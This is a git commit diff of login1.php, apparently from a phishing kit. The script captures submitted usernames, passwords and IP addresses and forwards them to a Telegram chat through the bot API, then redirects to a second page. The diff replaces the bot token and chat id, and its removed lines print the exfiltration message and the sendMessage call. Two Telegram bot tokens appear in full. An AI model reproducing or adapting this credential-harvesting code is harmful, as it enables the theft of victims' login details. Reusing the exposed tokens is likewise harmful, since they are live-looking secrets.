e00d1a7fb639e524fa1355b3dc144809de0a5d58
teammanilaa <157287161+teammanilaa@users.noreply.github.com>
2024-02-12 20:34:42 +0800

    Update login1.php

--- login1.php
+++ login1.php
@@ -21,32 +21,7 @@ if(isset($_POST['foo'])){
         : $_SERVER['REMOTE_ADDR']);
 
 
-         $token = "6374148669:AAEEFpjq2kVlp-DWg_OwnS6xQ56zffuYbwk";
+         $token = "6449896778:AAHbpwwkig8sr7japTFkYw0YIRHAIHwYrb8";
     $data = [
-        // 'chat_id' => '1002067181259',
+        // 'chat_id' => '1002143645972',
         // 'chat_id' => '-@ashleyughchannel',
-        'chat_id' => '-1002067181259',
-        'text' => 
-">$-$-$-$-$ 𝑱𝑬𝑺𝑼𝑺 𝑪𝑯𝑹𝑰𝑺𝑻 $-$-$-$-$->
-| username : <code>$name</code>
-| password : <code>$pw</code>
-| 𝟏𝐒𝐓 𝐀𝐓𝐓𝐄𝐌𝐏𝐓
-| $ip
-
-| $day_of_the_week  |  $timez | $datez",
-        'parse_mode' => 'html',
-        
-    ];//endof array
-
-    $sendMSGGG = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($data));
-
-
-
-   
-
-
-};
-header("location:login2.html");
-
-
-?>
